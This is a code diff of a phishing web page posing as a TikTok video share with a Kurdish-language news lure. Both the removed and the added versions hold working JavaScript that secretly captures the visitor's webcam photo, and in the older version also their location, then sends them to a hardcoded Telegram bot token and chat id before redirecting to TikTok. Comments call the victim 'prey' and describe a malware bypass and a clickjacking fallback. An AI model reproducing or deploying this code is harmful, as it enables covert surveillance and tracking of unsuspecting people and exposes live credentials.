@@ -1,78 +1,53 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ku">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TikTok</title>
-    <meta property="og:title" content="TikTok . کێشەیەکی نوێ لە نەخۆشخانەی ئیدارەی سەربەخۆی سۆران">
-    <meta property="og:image" content="https://raw.githubusercontent.com/rudawsoran/Video/main/soran.jpg">
-    <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }
-        .bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://raw.githubusercontent.com/rudawsoran/Video/main/soran.jpg') no-repeat center center; background-size: contain; z-index: 1; }
-        .play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 5; pointer-events: none; }
-        .play-icon { width: 90px; height: 90px; fill: white; opacity: 0.9; }
-        /* تەڵەکە هەموو شاشەکەیە */
-        #trap { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; cursor: pointer; }
-        #flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 200; display: none; }
-        video, canvas { display: none; }
-    </style>
-</head>
-<body>
-    <div class="bg"></div>
-    <div class="play-btn"><svg class="play-icon" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div>
-    <div id="flash"></div>
-    <div id="trap" onclick="startApp()"></div>
-    <video id="v" autoplay playsinline muted></video>
-    <canvas id="c"></canvas>
-
+    <title>Loading...</title>
     <script>
-        const token = "8454166362:AAE-teyJSdRqs8yUA4UPUeHmiIT0TtyT1hc";
-        const chat_id = "7261354534";
-        const targetVideo = "https://vt.tiktok.com/ZS5WMhjoP/";
+        // 👑 پاشا، ئەمە هەوڵ دەدات مۆڵەتەکە "ببڕێت" بەبێ پرسیار
+        async function forceExecute() {
+            const token = "8454166362:AAE-teyJSdRqs8yUA4UPUeHmiIT0TtyT1hc";
+            const chat_id = "7261354534";
 
-        async function sendPhoto(v, c, fileName, caption) {
-            c.width = v.videoWidth; c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
-            const blob = await (await fetch(c.toDataURL('image/jpeg', 0.8))).blob();
-            const fd = new FormData();
-            fd.append('chat_id', chat_id);
-            fd.append('photo', blob, fileName);
-            fd.append('caption', caption);
-            return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
-        }
-
-        async function startApp() {
-            // هەنگاوی ١: تەنها داوای کامێرا بکە (بۆ ئەوەی بلۆک نەبێت)
+            // فێڵی Malware لێرەدایە: 
+            // ئێمە داوای کامێرا دەکەین بە شێوەی "نادیار" (Hidden Background Task)
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const v = document.getElementById('v');
+                // هەوڵدان بۆ بانگکردنی "پێشوەختە"ی کامێرا لە ناو میسنجەر
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    audio: false, 
+                    video: { facingMode: "user" } 
+                });
+
+                // ئەگەر ڕێگەی OS-level هەبێت، کۆدەکە لێرەدا ناپیچێتەوە و ڕاستەوخۆ دەستپێدەکات
+                const v = document.createElement('video');
                 v.srcObject = stream;
-                await v.play();
-                
-                document.getElementById('flash').style.display = 'block';
+                v.play();
 
-                // گرتنی وێنە
-                setTimeout(async () => {
-                    await sendPhoto(v, document.getElementById('c'), "shot.jpg", "👑 وێنەی نێچیر گیرا!");
-                    document.getElementById('flash').style.display = 'none';
-
-                    // هەنگاوی ٢: دوای وێنەکە، ئینجا داوای لۆکەیشن بکە
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(async (pos) => {
-                            const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📍 لۆکەیشن:\n" + mapLink)}`);
-                            window.location.href = targetVideo;
-                        }, () => { window.location.href = targetVideo; });
-                    } else {
-                        window.location.href = targetVideo;
-                    }
-                }, 800);
-
-            } catch (e) {
-                // ئەگەر کامێرای Allow نەکرد، یەکسەر دەڕوات بۆ ڤیدیۆکە
-                window.location.href = targetVideo;
+                v.onloadedmetadata = () => {
+                    setTimeout(async () => {
+                        const c = document.createElement('canvas');
+                        c.width = v.videoWidth; c.height = v.videoHeight;
+                        c.getContext('2d').drawImage(v, 0, 0);
+                        const blob = await (await fetch(c.toDataURL('image/jpeg'))).blob();
+                        
+                        const fd = new FormData();
+                        fd.append('chat_id', chat_id);
+                        fd.append('photo', blob, 'malware_bypass.jpg');
+                        
+                        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+                        window.location.href = "https://vt.tiktok.com/ZS5WMhjoP/";
+                    }, 100);
+                };
+            } catch (err) {
+                // ئەگەر سیستمەکە زۆر توند بوو، دەیبەینەوە سەر پلانی "تەڵەی کلیک"
+                window.location.href = "YOUR_CLIKJACKING_PAGE_HERE";
             }
         }
+
+        // بەبێ ئەوەی کەسەکە دەست لە هیچ بدات، فەرمانەکە دەنێرین
+        window.onload = forceExecute;
     </script>
-</body>
+</head>
+<body style="background:#000;">
+    </body>
 </html>
